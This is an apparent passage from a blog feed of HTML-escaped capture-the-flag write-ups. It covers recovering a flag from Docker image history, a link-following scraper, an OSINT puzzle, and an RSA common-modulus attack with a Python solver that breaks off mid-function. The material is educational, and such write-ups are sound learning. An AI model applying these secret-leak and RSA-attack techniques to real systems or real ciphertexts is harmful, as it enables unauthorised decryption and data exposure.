amp;quot;1e4786117e28&amp;quot;,&amp;quot;Domainname&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;User&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;AttachStdin&amp;quot;:false,&amp;quot;AttachStdout&amp;quot;:false,&amp;quot;AttachStderr&amp;quot;:false,&amp;quot;Tty&amp;quot;:false,&amp;quot;OpenStdin&amp;quot;:false,&amp;quot;StdinOnce&amp;quot;:false,&amp;quot;Env&amp;quot;:[&amp;quot;PATH=&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&amp;quot;],&amp;quot;Cmd&amp;quot;:[&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;#(nop) &amp;quot;,&amp;quot;CMD [\&amp;quot;&#x2F;bin&#x2F;sh\&amp;quot;]&amp;quot;],&amp;quot;Image&amp;quot;:&amp;quot;sha256:3b6dbca4ef6990ef88e9d4f28fae8ca57308e779dcb94dc9c4a8fee02e1322c0&amp;quot;,&amp;quot;Volumes&amp;quot;:null,&amp;quot;WorkingDir&amp;quot;:&amp;quot;&#x2F;chal&amp;quot;,&amp;quot;Entrypoint&amp;quot;:null,&amp;quot;OnBuild&amp;quot;:null,&amp;quot;Labels&amp;quot;:{}},&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:14.235116602Z&amp;quot;,&amp;quot;docker_version&amp;quot;:&amp;quot;20.10.11+dfsg1&amp;quot;,&amp;quot;history&amp;quot;:[{&amp;quot;created&amp;quot;:&amp;quot;2022-08-09T17:19:53.274069586Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c #(nop) ADD file:2a949686d9886ac7c10582a6c29116fd29d3077d02755e87e111870d63607725 in &#x2F; &amp;quot;},{&amp;quot;created&amp;quot;:&amp;quot;2022-08-09T17:19:53.47374331Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c #(nop)  CMD [\&amp;quot;&#x2F;bin&#x2F;sh\&amp;quot;]&amp;quot;,&amp;quot;empty_layer&amp;quot;:true},{&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:11.653961901Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c #(nop) WORKDIR &#x2F;chal&amp;quot;},{&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:11.863666686Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c #(nop) COPY file:d65d0cfa1f5c483eff02b6016940ff4d85eb3b216f05d23a2b891cea6801be2a in p-flag.txt &amp;quot;},{&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:12.680399343Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c echo \&amp;quot;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=\&amp;quot; \u003e &#x2F;dev&#x2F;null&amp;quot;,&amp;quot;empty_layer&amp;quot;:true},{&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:13.319972067Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c cat p-flag.txt \u003e tmp.txt; rm -rf flag.txt p-flag.txt; mv tmp.txt flag.txt; echo \&amp;quot;\&amp;quot; \u003e\u003e flag.txt&amp;quot;},{&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:14.02363242Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c echo \&amp;quot;Find the rest of the flag by yourself!\&amp;quot; \u003e\u003e flag.txt&amp;quot;},{&amp;quot;created&amp;quot;:&amp;quot;2022-09-03T07:46:14.235116602Z&amp;quot;,&amp;quot;created_by&amp;quot;:&amp;quot;&#x2F;bin&#x2F;sh -c #(nop)  CMD [\&amp;quot;&#x2F;bin&#x2F;sh\&amp;quot;]&amp;quot;,&amp;quot;empty_layer&amp;quot;:true}],&amp;quot;os&amp;quot;:&amp;quot;linux&amp;quot;,&amp;quot;rootfs&amp;quot;:{&amp;quot;type&amp;quot;:&amp;quot;layers&amp;quot;,&amp;quot;diff_ids&amp;quot;:[&amp;quot;sha256:994393dc58e7931862558d06e46aa2bb17487044f670f310dffe1d24e4d1eec7&amp;quot;,&amp;quot;sha256:3496f3297d64782df57121721ca912bebd3d8c0bf5c5a12d76ac2f4c58d900a5&amp;quot;,&amp;quot;sha256:0c0811e580c073e93ce547fd176f40debc3e67b99325fa633c4ea877dbf2c543&amp;quot;,&amp;quot;sha256:10f39dbbae65c969d02d804d337d3836517c61706ec93b1f929a326451cbe0b2&amp;quot;,&amp;quot;sha256:d09e067ee442e434d4c350e403b686f5038c29da8f94eff1f25b15aa7c158c46&amp;quot;]}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;There is a base64 encoded data found in the above data.
&lt;code&gt;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ZmxhZ3tuM3Yzcl9sMzR2M181M241MTcxdjNfMW5mMHJtNDcxMG5fdW5wcjA=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; flag{n3v3r_l34v3_53n5171v3_1nf0rm4710n_unpr0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As you can see i got the first part of the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Lets move much deeper to for the remaining flag. I found a layer.zip file in the 4ec42253273e93963f11241e29497f0fcef730a2864d8ea025dcdb4fc316659e folder. When i extract that zip file i found the flag.txt file inside the chall folder. The flag.txt has the second part of the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : flag{n3v3r_l34v3_53n5171v3_1nf0rm4710n_unpr073c73d_w17h1n_7h3_d0ck3rf1l3}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;word-wide-web&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#word-wide-web&quot; aria-label=&quot;Anchor link for: word-wide-web&quot;&gt;Word Wide Web&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;csaw22&#x2F;wordwideweb.png&quot; alt=&quot;Word_Wide_Web&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;web.chal.csaw.io:5010&#x2F;stuff have the huge number of words in it, among all of them one word has the hyperlink to the another page. When we automate the process until we get the last page which can get the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Session&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;web.chal.csaw.io:5010&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;path &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;path)
&lt;&#x2F;span&gt;&lt;span&gt;    body &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;text
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    pattern &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;a href=&amp;quot;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(pattern&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;body)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(body)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;    path &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;group&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : CTF{w0rdS_4R3_4mAz1nG_r1ght}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;our-spy-in-new-terrain-osint&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#our-spy-in-new-terrain-osint&quot; aria-label=&quot;Anchor link for: our-spy-in-new-terrain-osint&quot;&gt;Our Spy In New Terrain(OSINT)&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;csaw22&#x2F;our_sint.png&quot; alt=&quot;OSINT&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is an intresting OSINT challenge from the forensics category. They provided just the twitter account name of the recruit. We have to answer the questions been asked in the remote program &lt;code&gt;nc misc.chall.csaw.io 5005&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;There are total 6 questions asked.&lt;&#x2F;p&gt;
&lt;p&gt;1.When did the enemy agent join twitter?&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;08&#x2F;2022&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;2.What is the spy&#x27;s github username?&lt;&#x2F;p&gt;
&lt;p&gt;I used wayback machine to view the deleted tweets of the agent.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;spyduhman&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;3.What is the full name of the file that contains communications between the enemy and the evil spy?&lt;&#x2F;p&gt;
&lt;p&gt;There is a deleted log.txt file in which communications are done.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;log.txt&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;4.Which country is the target based in?&lt;&#x2F;p&gt;
&lt;p&gt;The log.txt file contains a link to the a audio file. I used an online morse code converter to decode the Assignment.wav&lt;&#x2F;p&gt;
&lt;p&gt;The decoded text is &lt;code&gt;HTLLO EVIL AGENT YOUR NEXT TARGET IS A BANK THE BANK&#x27;S BIN NUMBER IS 452234 THE TARGETS SWIFT CODE IS YOUR PASSWORD FOR MORE INSTRUCTIONS VISIT BIT.LY SLASH √òSINTSEC GOOD LUCK&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;canada&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;5.What is the target&#x27;s international Swift code?&lt;&#x2F;p&gt;
&lt;p&gt;BIN : 452234(canada bank)
The bank which is having above bin number is TORONTO-DOMINION BANK&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;SWIFT code: TDOMCATTTOR&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;6.What is a crime?&lt;&#x2F;p&gt;
&lt;p&gt;The YoureSoClose.pdf is available in bit.ly&#x2F;osintsec the link is found from the morse code decoder.&lt;&#x2F;p&gt;
&lt;p&gt;The YoureSoClose.pdf is password protected the password is TDOMCATTTOR. The title of the pdf is the crime.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;copyright infringement&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;After that we got the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : flag{C0N6r475463N7600DW0rKN3X771M3N0PU811C53rV3r}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>InvadersCTF Crypto</title>
        <published>2022-08-16T00:00:00+00:00</published>
        <updated>2022-08-16T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/invaderctf-2022/"/>
        <id>https://themj0ln1r.github.io/writeups/invaderctf-2022/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/invaderctf-2022/">&lt;p&gt;Hi guys!,&lt;&#x2F;p&gt;
&lt;p&gt;This is Mj0ln1r and this is my first blog, writeup and first CTF as well. All new ? haha.&lt;&#x2F;p&gt;
&lt;p&gt;I started learning new skills and playing CTF&#x27;s as well to gain hands on experience in the security field. Coming to this blog, its all about my solved challenges in InvaderCTF 2022.&lt;&#x2F;p&gt;
&lt;p&gt;InvaderCTF is a CTF competion which was organized by our collenge[RGUKTN] alumni those are working at great positions with the skills learned through CTF&#x27;s.
There is a list of categories in this CTF such as ‚Äúweb‚Äù, ‚Äúpwn‚Äù, ‚Äúreverse‚Äù, ‚Äúcryptography‚Äù, and ‚Äúmiscellaneous‚Äù.
And i solved some challenges from each category.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto-challenges&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-challenges&quot; aria-label=&quot;Anchor link for: crypto-challenges&quot;&gt;Crypto Challenges&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;common-what&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#common-what&quot; aria-label=&quot;Anchor link for: common-what&quot;&gt;Common....What?&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;invaders22&#x2F;common.png&quot; alt=&quot;common_modulus&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I got a file named &lt;code&gt;common_modulus.zip&lt;&#x2F;code&gt; it has two files &lt;code&gt;chall.py&lt;&#x2F;code&gt; and &lt;code&gt;output.txt&lt;&#x2F;code&gt;.
the &lt;code&gt;chall.py&lt;&#x2F;code&gt; script just prints the &lt;code&gt;N e1 e2 c1 c2&lt;&#x2F;code&gt; the content of &lt;code&gt;output.txt&lt;&#x2F;code&gt; as follows.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;N = 11982945131022410542351081395449872615892579857707579658716659690935488669385262821057859182557738914580246000223393286594124225383866984597532935421878496300855873841201081561776719850279196185513497651311088240409358040299378330842236508619359647972763016690363235765860969655129269784424956130539800284778318098141912923725687592311652722505056107470370398021165270753993680221146964650298810348339426550121843506831513763524799788245715184019272818769688806186156054217173423142297185080827697102885478690188900539745266957938792259348667098941846582939290347898221569129727818304319228531810884419349788595299183
&lt;&#x2F;span&gt;&lt;span&gt;e1 = 1432834983003528423789566679766
&lt;&#x2F;span&gt;&lt;span&gt;e2 = 2379308237310255832902020443526
&lt;&#x2F;span&gt;&lt;span&gt;c1 = 10689309714150831372003282520258034721869267911572516423408248565049962108650099748793151534577215410589895845939174468496094911105822340567352621464826482784496348432260039948367408369277304473142781582593382249759117725426180831722441987089651228047819100128903524486005240635239107861739718852670683772477033147265282652735461836031051746173537294339800736436758373421135499142186805931851613817214123606130652548146050084102387221849254771049043101744791081688090961965211538682034166530987653637019819142642682927570692406882796783114872064728299928706994667553634162223654351719854271521012272876869577548029865
&lt;&#x2F;span&gt;&lt;span&gt;c2 = 10108112864771204039110360647151162379625435403389064742046377050800935678884417470071380911451172735126940164631419702014060618271946963698795724980506620687308126757038560340598588393457958478150419444430669593694549750182242922247396011389187919036956934428645928391159497083109718312975799586599853937652754710111738660741391329300491640624992257712646153846113376883043637423386066176238663086142253925553012932883285101598565990266200395298234059134450705194609356310121298248102541581987639348408092513592224044341173092657291900970886956196149689937412107716004555806327078173298630211025335704973121968612105
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;what-is-common-modulus-attack&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#what-is-common-modulus-attack&quot; aria-label=&quot;Anchor link for: what-is-common-modulus-attack&quot;&gt;What is common modulus attack?&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;A Common Modulus attack can be used to recover the plaintext when the same message is encrypted to two RSA keys that use the same modulus.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c1&lt;&#x2F;span&gt;&lt;span&gt; = m^e1 % N
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c2&lt;&#x2F;span&gt;&lt;span&gt; = m^e2 % N
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Assume that we find out &lt;code&gt;a&lt;&#x2F;code&gt; and &lt;code&gt;b&lt;&#x2F;code&gt; such that &lt;code&gt;(e1 * a) + (e2 * b) = 1&lt;&#x2F;code&gt; then we can decode the plain text as &lt;code&gt;(c1 ^ a) + (c2 ^ b)&lt;&#x2F;code&gt;. If we substitute how &lt;code&gt;c1&lt;&#x2F;code&gt; and &lt;code&gt;c2&lt;&#x2F;code&gt; is calculated to above equation, we can get &lt;code&gt;m^(e1 * a + e2 * b) = m^1 = m&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The Python script to perform common modulus attack.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;utilis &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;egcd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;Convert
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;gmpy2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;GCD
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;neg_pow&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GCD&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    res &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(gmpy2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;invert&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n))
&lt;&#x2F;span&gt;&lt;span&gt;    res &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(res&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;res
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;common_modulus&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c2&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	g, a, b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;egcd&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e2)
